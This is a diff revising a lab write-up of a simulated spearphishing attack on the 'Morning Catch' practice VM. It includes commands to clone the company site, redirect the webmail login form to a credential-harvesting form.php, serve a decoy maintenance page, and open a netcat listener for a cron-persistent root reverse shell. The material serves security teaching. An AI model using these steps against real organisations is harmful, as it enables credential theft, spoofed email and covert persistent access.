@@ -4,15 +4,15 @@
 
 ### Scenario
 
-This laboratory describes a Spearphishing attack to a company CEO with the purpose of stealing credentials, accessing the system and then stealing sensitive information for Double Extortion.
+This laboratory describes a spearphishing attack targeting a company CEO with the purpose of stealing credentials, accessing the system, and subsequently stealing sensitive information for double extortion, while also obtaining a persistent reverse shell with root privileges.
 
-**Threat model:** adversary with access to the private internal network of the company.
+**Threat model:** Adversary with access to the private internal network of the company.
 
 ### Prerequisites
 
 #### Virtual Environment
 
-To execute this laboratory, VMware was used to virtualize 2 VMs, with Host-Only network connection:
+To execute this laboratory, VMware was used to virtualize 2 VMs, with a Host-Only network connection:
 
 * **Kali Linux** → the attacker machine
 * **Morning Catch - Phishing Industries** → the victim machine: a vulnerable VMware virtual machine, similar to Metasploitable, made for simulating Phishing attacks
@@ -62,7 +62,7 @@ ClientConn: 192.168	0
 
 ### Phase 1: Phishing
 
-**Objective:** obtain the credentials of the Morning Catch's CEO.
+**Objective:** Obtain the credentials of the Morning Catch's CEO.
 
 #### 1.1. Reconnaissance and Discovery
 
@@ -88,7 +88,7 @@ The attacker explores the website of the of Morning Catch on `http://morningcatc
 
 Great! Now the attacker knows the mail of the CEO (our target) and the one of the System Administrator, which will be use later to impersonate him.
 
-By clicking "Employee login" , there's also a login page to access the corporate Mail. 
+By clicking "Employee login" , there's also a login page to access the corporate webmail. 
 
 <img src="images/login.png" alt="form " style="zoom:35%;" />
 
@@ -96,14 +96,14 @@ The idea for realizing the first phase is to clone the entire website and create
 
 #### 1.2. Cloning
 
-The attacker firstly clones the entire Morning Catch website, using `wget`. This command downloads all the web resources of the company website, making the dependencies local. Then all is moved to the root directory of Apache.
+The attacker firstly clones the entire Morning Catch website, using `wget`. This command downloads all the web resources of the company website, making the dependencies local. Then, everything is moved to the root directory of Apache.
 
 ```bash
 wget -r -k -p morningcatch.ph
 sudo mv morningcatch.ph/* /var/www/html
 ```
 
-The attacker then clones the web login page to access mail of Morning Catch separetly. This will allow for the `mail` directory to be created, so the url of the login form will be more similar to the original one. 
+Next, the attacker then clones the web login page separetly. This will allow for the `mail` directory to be created, making the URL of the login form more similar to the original one. 
 
 ```bash
 rm /var/www/html/mail
@@ -113,7 +113,9 @@ sudo mv morningcatch.ph/mail /var/www/html
 
 #### 1.3. Modify the login form
 
-The attacker modifies, in the `mail/index.html` file, the form action element from `action="index.html"` to `action="form.php"`.
+###### `index.html`
+
+The attacker modifies, in the `mail/index.html` file, the form action element to `"form.php"`.
 
 ```bash
 sudo nano /var/www/html/mail/index.html
@@ -131,11 +133,28 @@ New post element:
 <form name="form" action="form.php" method="post">
 ```
 
-Then the attacker adds to the directory the html file `task-mail`, that will be loaded after inserting the credentials, showing an "Under construction" message to reduce immediate suspicion.
+###### `task-mail`
+
+Then the attacker adds the HTML file `task-mail` to the directory. This page will be loaded after submitting the credentials, showing a basic “System Maintenance” message to reduce immediate suspicion.
 
 ```bash
 sudo cp task-mail /var/www/html/mail
 ```
+
+It could look like this:
+
+```html
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>System Maintenance</title></head>
+<body>
+  <h1>System Maintenance</h1>
+  <p>Scheduled maintenance in progress. Please try again later.</p>
+</body>
+</html>
+```
+
+###### `form.php`
 
 Therefore the `form.php` needs to:
 
@@ -158,7 +177,9 @@ die();
 ?>
 ```
 
-The attacker creates `creds.txt` and changes its owner to `www-data` (the user running the web server process), so that it can be modified during the execution of the script.
+###### `creds.txt`
+
+The attacker finally creates `creds.txt` and changes its owner to `www-data` (the user running the web server process), so that it can be modified during the execution of the script.
 
 ```
 sudo cp form.php /var/www/html/mail
@@ -202,7 +223,7 @@ Boyd
 quit
 ```
 
-**Note:** this spoofing step is possible due to the vulnerable Sendmail server, configured to allow unauthenticated relaying from internal network addresses.
+**Note:** This spoofing step is possible due to the vulnerable Sendmail server, configured to allow unauthenticated relaying from internal network addresses.
 
 ###### Richard POV
 
@@ -210,13 +231,13 @@ Richard Bourn checks his email and receives the message (from the real Boyd Jeni
 
 <img src="images/mail.png" alt="Screenshot 2025-06-06 alle 18.43.04 " style="zoom:50%;" />
 
-Then Richard enters the username and password, that we can find in the `creds.txt` file. Now we know his credentials: threat escalated!
+Then Richard enters the username and password, which can now be found in the `creds.txt` file. Now the attacker has his credentials, escalating the threat!
 
 <img src="images/cred.png" alt="Screenshot 2025-06-08 alle 17.12.42 " style="zoom:50%;" />
 
 ### Phase 2: Execution and Exfiltration
 
-**Objective:** get inside the CEO's machine and steal sensitive material.
+**Objective:** Get inside the CEO's machine and steal sensitive material.
 
 #### 2.1. Exploring Richard's Machine
 
@@ -240,6 +261,8 @@ The attacker decides to steal these files, which could be done directly with RDP
 
 #### 2.2. Reverse Shell with Persistence
 
+###### `innocent.sh`
+
 The attacker has written `innocent.sh`, a script that spawns the reverse shell and mantains access using `cron`.
 
 ```bash
@@ -259,6 +282,8 @@ eval "$SAFETYCOM"
 
 **Note:** the cronjob will be executed with the privileges of the user that executes `innocent.sh`.
 
+###### Server
+
 On the attacker machine: the script is added to the root directory of Apache and then the attacker opens a listener with `netcat`. 
 
 ```bash
@@ -267,6 +292,8 @@ nc -lvnp 4444
 ```
 
 This will allow the victime to download the script via HTTP.  When he will execute it, he will connect to the listener and the reverse shell will be obtained.
+
+###### Client
 
 From the victim terminal (to which the attacker has access to, thanks to RDP), the attacker:
 
@@ -282,7 +309,7 @@ The attacker has successfully obtained a remote shell with `root` privileges tha
 
 <img src="images/root.png" alt="Screenshot 2025-06-08 alle 15.40.13 " style="zoom:50%;" />
 
-While `rbourne` had sufficient privileges to execute the final step of this attack, this persistent reverse shell has system wide access and could be used for potential future attacks. Furthermore, the CEO might not even realize it exists, since he will be distracted by the missing files.
+**Note:** While `rbourne` had sufficient privileges to execute the final step of this attack, this persistent reverse shell has system wide access and could be used for potential future attacks. Furthermore, the CEO might not even realize it exists, since he will be distracted by the missing files.
 
 #### 2.3. Stealing the files
 
